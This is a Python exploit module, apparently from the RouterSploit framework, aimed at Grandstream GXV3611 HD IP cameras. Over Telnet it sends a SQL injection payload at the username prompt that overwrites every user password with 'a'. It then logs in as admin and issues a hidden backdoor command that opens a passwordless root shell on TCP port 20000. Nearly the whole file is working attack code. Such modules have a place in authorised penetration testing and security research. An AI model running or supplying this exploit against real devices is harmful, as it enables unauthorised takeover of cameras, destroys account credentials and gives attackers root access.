from routersploit.core.exploit import *
from routersploit.core.telnet.telnet_client import TelnetClient


class Exploit(TelnetClient):
    __info__ = {
        "name": "Grandsteam GXV3611 HD - SQL Injection",
        "description": "Module exploits an SQL injection vulnerability in Grandstream GXV3611_HD IP cameras. "
                       "After the SQLI is triggered, the module opens a backdoor on TCP/20000 and connects to it.",
        "authors": (
            "pizza1337",       # exploit author
            "Joshua Abraham",  # routesploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40441/",
            "http://boredhackerblog.blogspot.com/2016/05/hacking-ip-camera-grandstream-gxv3611hd.html",
        ),
        "devices": (
            "Grandstream GXV3611 HD",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(23, "Target Telnet port")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable...")

            tn = self.telnet_connect()

            self.telnet_read_until(tn, "Username: ")
            self.telnet_write(tn, "';update user set password='a';--\r\n")  # This changes all the passwords to 'a'
            self.telnet_read_until(tn, "Password: ")
            self.telnet_write(tn, "nothing\r\n")
            self.telnet_read_until(tn, "Username: ")
            self.telnet_write(tn, "admin\r\n")
            self.telnet_read_until(tn, "Password: ")
            self.telnet_write(tn, "a\r\n")  # Login with the new password
            self.telnet_read_until(tn, "> ")
            self.telnet_write(tn, "!#/ port lol\r\n")  # Backdoor command triggers telnet server to startup.
            self.telnet_read_until(tn, "> ")
            self.telnet_write(tn, "quit\r\n")
            self.telnet_close()

            print_success("SQLI successful, going to telnet into port 20000 "
                          "with username root and no password to get shell")

        else:
            print_error("Exploit failed. Target does not appear vulnerable")

    @mute
    def check(self):
        tn = self.telnet_connect()

        res = self.telnet_read_until(tn, "login:")
        if res and "Grandstream" in res:
            return True

        return False
